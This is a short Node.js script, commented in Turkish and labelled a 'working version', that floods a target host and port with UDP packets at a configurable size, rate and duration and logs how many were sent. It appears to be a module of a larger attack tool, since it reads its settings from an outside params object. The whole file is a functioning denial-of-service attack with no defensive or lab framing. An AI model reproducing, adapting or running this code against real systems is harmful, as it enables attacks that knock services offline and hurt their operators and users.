// udp_flood.js - ÇALIŞAN VERSİYON
const dgram = require('dgram');

// Parametreler
const target = params.target;
const port = params.port;
const duration = (params.duration || 10) * 1000; // ms
const packetSize = params.packetSize || 1024; // 1KB
const rate = params.rate || 100; // saniyede 100 paket

console.log(`[+] UDP Flood: ${target}:${port} - ${duration/1000}s`);

// Tek bir socket oluştur
const socket = dgram.createSocket('udp4');
socket.unref(); // Programın kapanmasını engelleme

// Packet oluştur
const payload = Buffer.alloc(packetSize, 'X');

let sentCount = 0;
let startTime = Date.now();

// Her saniye rate kadar paket gönder
const interval = setInterval(() => {
    const now = Date.now();
    
    // Süre doldu mu?
    if (now - startTime >= duration) {
        clearInterval(interval);
        socket.close();
        console.log(`[+] UDP Flood bitti: ${sentCount} paket`);
        return;
    }
    
    // Rate kadar paket gönder
    for (let i = 0; i < rate; i++) {
        socket.send(payload, 0, payload.length, port, target, (err) => {
            if (!err) sentCount++;
        });
    }
    
    // Her saniye log
    console.log(`[+] ${sentCount} paket gönderildi...`);
    
}, 1000); // Her saniye

// Hata yönetimi
socket.on('error', (err) => {
    console.log(`[!] Socket hatası: ${err.message}`);
});
